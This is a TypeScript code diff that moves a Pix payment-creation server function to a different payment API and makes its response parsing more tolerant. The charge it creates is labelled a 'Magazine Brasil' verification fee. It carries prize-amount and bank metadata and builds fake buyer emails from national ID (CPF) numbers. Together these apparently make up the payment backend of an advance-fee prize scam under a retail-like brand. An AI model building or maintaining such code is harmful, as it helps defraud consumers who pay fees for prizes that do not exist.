@@ -20,23 +20,25 @@ export const createPixTransaction = createServerFn({ method: "POST" })
     const external_id = `mag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
 
     const body = {
-      external_id,
-      payment_method: "pix",
-      amount: amountCents,
-      buyer: {
-        name: data.nome,
-        email: `${cpfDigits}@magazine-brasil.com`,
-        document: cpfDigits,
+      product: "Taxa de verificação Magazine Brasil",
+      amountCents,
+      clientName: data.nome,
+      clientEmail: `${cpfDigits}@magazine-brasil.com`,
+      clientDocument: cpfDigits,
+      paymentMethod: "PIX",
+      metadata: {
+        external_id,
+        premio_valor: data.premio_valor ?? null,
+        banco: data.banco ?? null,
       },
     };
 
-    const res = await fetch("https://api.realtechdev.com.br/v1/transactions", {
+    const res = await fetch("https://upay-sistema-api.onrender.com/api/v1/transactions", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         Accept: "application/json",
-        Authorization: `Bearer ${token}`,
-        "User-Agent": "BuckPay API",
+        "API-Key": token.trim(),
       },
       body: JSON.stringify(body),
     });
@@ -51,6 +53,7 @@ export const createPixTransaction = createServerFn({ method: "POST" })
 
     if (!res.ok) {
       const message =
+        json?.message ||
         json?.error?.message ||
         json?.error?.detail ||
         `Falha ao criar transação Pix (status ${res.status}).`;
@@ -58,9 +61,21 @@ export const createPixTransaction = createServerFn({ method: "POST" })
       throw new Error(typeof message === "string" ? message : "Falha ao criar transação Pix.");
     }
 
-    const pixCode: string | undefined = json?.data?.pix?.code;
-    const qrBase64: string | undefined = json?.data?.pix?.qrcode_base64;
-    const transactionId: string | undefined = json?.data?.id;
+    const transaction = json?.transaction ?? json?.data ?? json;
+    const pixCode: string | undefined =
+      transaction?.pixCode ||
+      transaction?.pix_code ||
+      transaction?.pix?.code ||
+      transaction?.pix?.copyPaste ||
+      transaction?.pix?.copy_paste ||
+      transaction?.qrCode ||
+      transaction?.qrcode;
+    const qrBase64: string | undefined =
+      transaction?.pixQrCodeBase64 ||
+      transaction?.qrcode_base64 ||
+      transaction?.pix?.qrcode_base64 ||
+      transaction?.pix?.qrCodeBase64;
+    const transactionId: string | undefined = transaction?.id;
 
     if (!pixCode) throw new Error("Resposta inválida da API Pix.");
 
